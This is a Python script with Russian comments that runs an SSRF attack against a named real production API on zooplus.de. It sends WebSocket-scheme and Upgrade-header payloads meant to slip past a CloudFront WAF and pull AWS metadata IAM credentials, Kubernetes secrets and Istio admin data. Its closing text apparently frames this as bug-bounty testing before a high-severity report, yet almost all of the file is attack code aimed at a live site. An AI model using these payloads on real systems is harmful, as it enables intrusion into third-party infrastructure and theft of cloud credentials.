#!/usr/bin/env python3
"""
HAIL MARY #1: WebSocket Upgrade SSRF
Вероятность: 5-10% (иногда WebSocket endpoints имеют другую валидацию)

Теория:
- CloudFront WAF может по-разному обрабатывать HTTP vs WebSocket
- ws:// protocol иногда bypassing WAF rules для http://
- Upgrade header может обходить некоторые фильтры
"""

import requests
import json
import time

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

print("="*80)
print("HAIL MARY #1: WebSocket Upgrade SSRF")
print("Вероятность успеха: 5-10%")
print("="*80)

# Test 1: ws:// protocol для AWS metadata
test_cases = [
    # AWS Metadata через WebSocket
    ("ws://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "AWS Metadata via WebSocket"),

    # K8s API через WebSocket
    ("ws://kubernetes.default.svc/api/v1/namespaces/default/secrets",
     "K8s API via WebSocket"),

    # Istio admin через WebSocket
    ("ws://localhost:15000/config_dump",
     "Istio Envoy via WebSocket"),

    # Internal services via WebSocket
    ("ws://127.0.0.1:8080/health",
     "Internal service via WebSocket"),
]

print("\n[TEST 1] WebSocket protocol bypass")
print("-" * 80)

for ws_url, description in test_cases:
    print(f"\n[*] Testing: {description}")
    print(f"    URL: {ws_url}")

    try:
        start = time.time()
        resp = requests.post(
            ENDPOINT,
            json={"url": ws_url},
            timeout=10,
            verify=False
        )
        elapsed = (time.time() - start) * 1000

        print(f"    Status: {resp.status_code}")
        print(f"    Timing: {elapsed:.1f}ms")
        print(f"    Response length: {len(resp.text)}")

        # Проверяем отличия от обычного SSRF
        if resp.status_code != 200:
            print(f"    [!] Different status code! Might bypass WAF")

        if len(resp.text) > 10:
            print(f"    [!!!] NON-EMPTY RESPONSE! Check content:")
            print(f"    {resp.text[:200]}")

        # Проверяем заголовки
        if 'Upgrade' in resp.headers or 'Connection' in resp.headers:
            print(f"    [!] WebSocket headers detected!")
            print(f"    Headers: {dict(resp.headers)}")

    except Exception as e:
        print(f"    [!] Error: {e}")

# Test 2: HTTP Upgrade header injection
print("\n\n[TEST 2] HTTP Upgrade header to trigger different code path")
print("-" * 80)

# Попробуем отправить Upgrade: websocket вместе с SSRF
upgrade_targets = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://kubernetes.default.svc/api/v1/namespaces/default/secrets",
]

for target in upgrade_targets:
    print(f"\n[*] Testing with Upgrade header: {target}")

    try:
        # Отправляем с WebSocket upgrade headers
        resp = requests.post(
            ENDPOINT,
            json={"url": target},
            headers={
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Version': '13',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
            },
            timeout=10,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:200] if len(resp.text) > 0 else 'empty'}")

        if resp.status_code == 101:  # Switching Protocols
            print(f"    [!!!] WEBSOCKET UPGRADE ACCEPTED!")
            print(f"    Headers: {dict(resp.headers)}")

    except Exception as e:
        print(f"    Error: {e}")

# Test 3: wss:// (WebSocket Secure)
print("\n\n[TEST 3] WebSocket Secure (wss://) protocol")
print("-" * 80)

wss_targets = [
    "wss://kubernetes.default.svc/api/v1/namespaces/default/secrets",
    "wss://localhost:15000/config_dump",
]

for target in wss_targets:
    print(f"\n[*] Testing: {target}")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": target},
            timeout=10,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Response: {resp.text[:200]}")

        if len(resp.text) > 10:
            print(f"    [!!!] Non-empty response!")

    except Exception as e:
        print(f"    Error: {e}")

print("\n" + "="*80)
print("ВЫВОД")
print("="*80)

print("""
Если все тесты вернули пустые {} и 200:
→ WebSocket bypass НЕ работает
→ Вероятность успеха была 5-10%, не сработало

Если хотя бы один тест показал:
- Другой status code (не 200)
- Non-empty response
- WebSocket upgrade accepted (101)
→ Возможно нашли новый bypass!

Следующий шаг:
Если ничего не сработало → ОТПРАВИТЬ ОТЧЕТ КАК HIGH SEVERITY
Если что-то сработало → Исследовать дальше
""")
